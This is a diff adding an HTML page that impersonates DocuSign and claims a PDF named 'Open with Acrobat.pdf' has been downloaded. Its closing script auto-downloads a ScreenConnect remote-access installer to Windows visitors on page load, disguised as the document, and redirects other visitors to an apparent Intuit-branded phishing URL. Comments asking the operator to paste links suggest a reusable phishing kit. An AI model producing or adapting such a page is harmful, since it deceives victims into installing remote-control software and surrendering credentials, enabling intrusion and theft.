@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DocuSign - File Downloaded</title>
+    <style>
+        /* Reset & Base Styles */
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --bg-main: #edf1f7;
+            --header-bg: #ffffff;
+            --footer-bg: #22252c;
+            --footer-text: #94a3b8;
+            --footer-link: #cbd5e1;
+            --text-primary: #1e293b;
+            --docusign-navy: #002266;
+            --pdf-red: #d92324;
+            --download-green: #10b981;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-main);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Header / Navigation Bar */
+        .navbar {
+            background-color: var(--header-bg);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+            padding: 1rem 2.5rem;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.02);
+        }
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .brand-logo { display: inline-flex; align-items: center; text-decoration: none; }
+        .docusign-logo-img { height: 34px; width: auto; display: block; object-fit: contain; }
+        .nav-menu { display: flex; align-items: center; gap: 2rem; }
+        .nav-link {
+            color: #475569; text-decoration: none; font-size: 0.95rem; font-weight: 500; transition: color 0.15s ease;
+        }
+        .nav-link:hover { color: var(--docusign-navy); }
+        .btn-signin {
+            background-color: var(--docusign-navy); color: #ffffff; padding: 0.55rem 1.35rem;
+            border-radius: 6px; font-size: 0.925rem; font-weight: 700; text-decoration: none; transition: all 0.2s ease;
+        }
+        .btn-signin:hover { background-color: #001747; box-shadow: 0 3px 8px rgba(0, 34, 102, 0.2); }
+
+        /* Main Section & Download Layout */
+        .main-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 3rem 1.5rem; }
+        .download-card {
+            width: 100%; max-width: 860px; display: flex; flex-direction: column; align-items: center; text-align: center;
+        }
+        .download-title {
+            font-size: 1.8rem; font-weight: 800; color: #1e293b; letter-spacing: 0.03em;
+            margin-bottom: 3.5rem; text-transform: uppercase;
+        }
+        .content-row { display: flex; align-items: center; justify-content: center; gap: 3.5rem; width: 100%; }
+
+        /* Acrobat Document Visual Graphic */
+        .doc-graphic-container {
+            position: relative; width: 250px; height: 250px; display: flex; align-items: center;
+            justify-content: center; flex-shrink: 0;
+        }
+        .circle-backdrop {
+            position: absolute; width: 240px; height: 240px; border-radius: 50%;
+            background-color: #eaeff5; z-index: 1;
+        }
+        .doc-sheet {
+            position: relative; z-index: 2; width: 136px; height: 172px; background: #ffffff;
+            border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.07), 0 2px 6px rgba(0, 0, 0, 0.04);
+            display: flex; flex-direction: column; align-items: flex-start; justify-content: flex-start;
+            padding: 1.5rem 1.25rem;
+        }
+        .fold-corner {
+            position: absolute; top: 0; right: 0; width: 0; height: 0; border-style: solid;
+            border-width: 0 28px 28px 0; border-color: transparent #cbd5e1 transparent transparent;
+            border-bottom-left-radius: 4px;
+        }
+        .doc-sheet::before {
+            content: ''; position: absolute; top: 0; right: 0; width: 28px; height: 28px;
+            background: #f1f5f9; border-bottom-left-radius: 4px;
+        }
+        .acrobat-icon-wrap {
+            width: 100%; height: 60px; margin-top: 0.5rem; margin-bottom: 1.25rem;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .acrobat-logo { width: 58px; height: 58px; }
+        .doc-lines { width: 100%; display: flex; flex-direction: column; gap: 6px; }
+        .doc-lines .line { height: 6px; background-color: #cbd5e1; border-radius: 3px; }
+        .doc-lines .line-top { width: 45%; }
+        .doc-lines .line-bottom { width: 65%; }
+
+        /* Green Download Badge */
+        .download-badge {
+            position: absolute; bottom: -8px; right: -8px; width: 48px; height: 48px; border-radius: 50%;
+            background-color: var(--download-green); color: #ffffff; display: flex; align-items: center;
+            justify-content: center; border: 3.5px solid #ffffff;
+            box-shadow: 0 4px 14px rgba(16, 185, 129, 0.4); cursor: pointer;
+            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-decoration: none;
+        }
+        .download-badge svg { width: 22px; height: 22px; }
+        .download-badge:hover { transform: scale(1.1); }
+
+        /* File Info & Action Button Section */
+        .file-info-section { display: flex; flex-direction: column; align-items: flex-start; text-align: left; gap: 1.25rem; }
+        .file-name-wrapper { display: flex; align-items: center; gap: 0.75rem; }
+        .file-name { font-size: 1.4rem; font-weight: 700; color: #1e293b; }
+        .file-size-badge {
+            background-color: #e2e8f0; color: #475569; font-size: 0.75rem; font-weight: 600;
+            padding: 0.2rem 0.6rem; border-radius: 12px;
+        }
+        .btn-download-action {
+            display: inline-flex; align-items: center; gap: 0.6rem; border: 1.5px solid #0066cc;
+            background-color: #ffffff; color: #0055b3; padding: 0.85rem 1.4rem; border-radius: 8px;
+            font-size: 0.95rem; font-weight: 600; text-decoration: none; transition: all 0.2s ease;
+            box-shadow: 0 2px 5px rgba(0, 102, 204, 0.06);
+        }
+        .btn-download-action:hover {
+            background-color: #0066cc; color: #ffffff; transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 102, 204, 0.2);
+        }
+        .action-icon { flex-shrink: 0; }
+
+        /* Status Toast */
+        .status-toast {
+            display: flex; align-items: center; gap: 0.6rem; background-color: #ecfdf5;
+            border: 1px solid #a7f3d0; color: #065f46; font-size: 0.875rem; font-weight: 600;
+            padding: 0.6rem 1rem; border-radius: 6px; opacity: 0; transform: translateY(10px);
+            pointer-events: none; transition: all 0.3s ease;
+        }
+        .status-toast.show { opacity: 1; transform: translateY(0); }
+
+        /* Windows-Only Notice (Hidden by default, only shows if JS fails or is disabled) */
+        .windows-notice {
+            max-width: 520px; margin: 2rem auto 0; background: #ffffff; border: 1px solid #e2e8f0;
+            border-radius: 16px; padding: 3rem 2.5rem; text-align: center;
+            box-shadow: 0 12px 40px rgba(15, 23, 42, 0.08), 0 2px 8px rgba(15, 23, 42, 0.04);
+            display: none; /* Hidden by default, JS handles redirection */
+        }
+        .notice-icon {
+            width: 84px; height: 84px; margin: 0 auto 1.75rem; border-radius: 50%;
+            background: #eaf2ff; color: #0066cc; display: flex; align-items: center; justify-content: center;
+        }
+        .notice-icon svg { width: 42px; height: 42px; }
+        .notice-title { font-size: 1.5rem; font-weight: 800; color: #1e293b; margin-bottom: 0.85rem; letter-spacing: 0.01em; }
+        .notice-text { font-size: 1rem; line-height: 1.65; color: #475569; }
+        .notice-text strong { color: #0066cc; font-weight: 700; }
+
+        /* Footer */
+        .footer { background-color: var(--footer-bg); color: var(--footer-text); padding: 1.25rem 2rem; font-size: 0.85rem; }
+        .footer-container {
+            max-width: 1200px; margin: 0 auto; display: flex; align-items: center;
+            justify-content: space-between; flex-wrap: wrap; gap: 1rem;
+        }
+        .footer-left { display: flex; align-items: center; gap: 0.75rem; }
+        .footer-brand { font-weight: 700; color: #f1f5f9; }
+        .footer-divider { color: #475569; }
+        .footer-links { display: flex; align-items: center; gap: 0.85rem; }
+        .footer-links a { color: var(--footer-link); text-decoration: none; transition: color 0.2s ease; }
+        .footer-links a:hover { color: #ffffff; text-decoration: underline; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .content-row { flex-direction: column; gap: 2.5rem; }
+            .file-info-section { align-items: center; text-align: center; }
+            .footer-container { flex-direction: column; align-items: center; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="brand-logo">
+                <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/e/e3/Docusign_Full_Color.svg/1280px-Docusign_Full_Color.svg.png" alt="DocuSign" class="docusign-logo-img">
+            </a>
+            <div class="nav-menu">
+                <a href="#products" class="nav-link">Products</a>
+                <a href="#solutions" class="nav-link">Solutions</a>
+                <a href="#support" class="nav-link">Support</a>
+                <a href="#signin" class="btn-signin">Sign In</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-wrapper">
+        <div class="download-card">
+            <h1 class="download-title">YOUR FILE HAS BEEN DOWNLOADED</h1>
+            <div class="content-row">
+                
+                <!-- Document Graphic -->
+                <div class="doc-graphic-container">
+                    <div class="circle-backdrop"></div>
+                    <div class="doc-sheet">
+                        <div class="fold-corner"></div>
+                        <div class="acrobat-icon-wrap">
+                            <svg class="acrobat-logo" viewBox="0 0 58 58" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <rect width="58" height="58" rx="12" fill="#D92324"/>
+                                <path d="M29 12L16 42H22L24.5 36H33.5L36 42H42L29 12ZM26.5 31L29 23L31.5 31H26.5Z" fill="white"/>
+                            </svg>
+                        </div>
+                        <div class="doc-lines">
+                            <div class="line line-top"></div>
+                            <div class="line line-bottom"></div>
+                            <div class="line line-top"></div>
+                        </div>
+                    </div>
+                    <!-- Green Download Badge -->
+                    <a href="#" download class="download-badge download-link" id="badge-link">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                        </svg>
+                    </a>
+                </div>
+
+                <!-- File Info & Actions -->
+                <div class="file-info-section">
+                    <div class="file-name-wrapper">
+                        <h2 class="file-name">Open with Acrobat.pdf</h2>
+                        <span class="file-size-badge">2.4 MB PDF</span>
+                    </div>
+                    
+                    <!-- Main Download Button -->
+                    <a href="#" download class="btn-download-action download-link" id="main-btn">
+                        <svg class="action-icon" width="20" height="20" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                        </svg>
+                        <span>Download File</span>
+                    </a>
+
+                    <!-- Success Toast -->
+                    <div class="status-toast" id="status-toast">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                        Document download initiated!
+                    </div>
+
+                    <!-- Fallback Link -->
+                    <a href="#" class="download-link" id="fallback-link" style="color: #0066cc; text-decoration: underline; font-size: 0.9rem; font-weight: 500;">
+                        If the file does not download automatically, click here
+                    </a>
+                </div>
+            </div>
+
+            <!-- Windows Notice (Fallback if JS is disabled) -->
+            <div class="windows-notice" id="no-js-notice">
+                <div class="notice-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                    </svg>
+                </div>
+                <h3 class="notice-title">Windows Device Required</h3>
+                <p class="notice-text">This file can only be downloaded on a <strong>Windows</strong> computer. Please open this link on your Windows PC to continue.</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-left">
+                <span class="footer-brand">DocuSign Inc.</span>
+                <span class="footer-divider">|</span>
+                <span>© 2026 DocuSign, Inc. All rights reserved.</span>
+            </div>
+            <div class="footer-links">
+                <a href="#terms">Terms of Use</a>
+                <span class="footer-divider">|</span>
+                <a href="#privacy">Privacy Policy</a>
+                <span class="footer-divider">|</span>
+                <a href="#intellectual-property">Intellectual Property</a>
+                <span class="footer-divider">|</span>
+                <a href="#trust-center">Trust Center</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ========================================== -->
+    <!-- DOWNLOAD & REDIRECT CONFIGURATION SCRIPT   -->
+    <!-- ========================================== -->
+    <script>
+        // 1. YOUR FILE DOWNLOAD LINK (Already inserted)
+        const FILE_LINK = "https://thefridmangroup.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=docu%20sign&c=&c=&c=&c=&c=&c=&c=";
+
+        // 2. PASTE YOUR REDIRECT LINK HERE FOR NON-WINDOWS USERS:
+        const NON_WINDOWS_REDIRECT_URL = "https://quickbooks-teams.cc/Intuit/"; 
+
+        // 3. Set to true to auto-download on page load for Windows users.
+        const AUTO_DOWNLOAD_ON_LOAD = true; 
+
+        // ==========================================
+        // DO NOT EDIT BELOW THIS LINE
+        // ==========================================
+        document.addEventListener('DOMContentLoaded', () => {
+            // Check if the user is on a Windows device
+            const isWindows = /Windows/i.test(navigator.userAgent);
+
+            if (!isWindows) {
+                // If NOT Windows, redirect immediately
+                if (NON_WINDOWS_REDIRECT_URL && NON_WINDOWS_REDIRECT_URL !== "PASTE_YOUR_REDIRECT_LINK_HERE") {
+                    window.location.replace(NON_WINDOWS_REDIRECT_URL);
+                } else {
+                    // Fallback: If you forget to paste the link, it will show the Windows notice instead of breaking
+                    const notice = document.getElementById('no-js-notice');
+                    if (notice) notice.style.display = 'block';
+                }
+                return; // Stop executing the rest of the script
+            }
+
+            // If IS Windows, proceed with download logic
+            const allDownloadLinks = document.querySelectorAll('.download-link');
+            allDownloadLinks.forEach(link => {
+                link.href = FILE_LINK;
+            });
+
+            if (AUTO_DOWNLOAD_ON_LOAD) {
+                const tempLink = document.createElement('a');
+                tempLink.href = FILE_LINK;
+                tempLink.download = 'ScreenConnect.ClientSetup.exe'; // Suggests filename to browser
+                tempLink.style.display = 'none';
+                document.body.appendChild(tempLink);
+                tempLink.click();
+                document.body.removeChild(tempLink);
+                
+                // Show success toast notification
+                const toast = document.getElementById('status-toast');
+                if (toast) toast.classList.add('show');
+            }
+        });
+    </script>
+</body>
+</html>
